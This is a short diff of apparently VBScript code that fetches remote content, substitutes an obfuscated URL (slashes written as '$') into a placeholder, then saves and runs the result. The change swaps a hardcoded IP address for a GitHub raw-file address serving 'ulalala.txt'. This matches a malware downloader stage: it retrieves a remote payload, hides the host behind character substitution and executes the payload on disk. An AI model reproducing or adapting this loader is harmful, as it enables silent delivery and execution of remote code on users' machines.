@@ -13,7 +13,7 @@ h.Send
 If h.Status = 200 Then
     content = h.ResponseText
     ' Fix the placeholder
-    content = Replace(content, "****", "http:$$115.187.41.77$ulalala.txt")
+    content = Replace(content, "****", "https:$$raw.githubusercontent.com$nytheonai-oss$hola$refs$heads$main$ulalala.txt")
     
     ' Save and run
     Set f = fs.CreateTextFile(target, True)
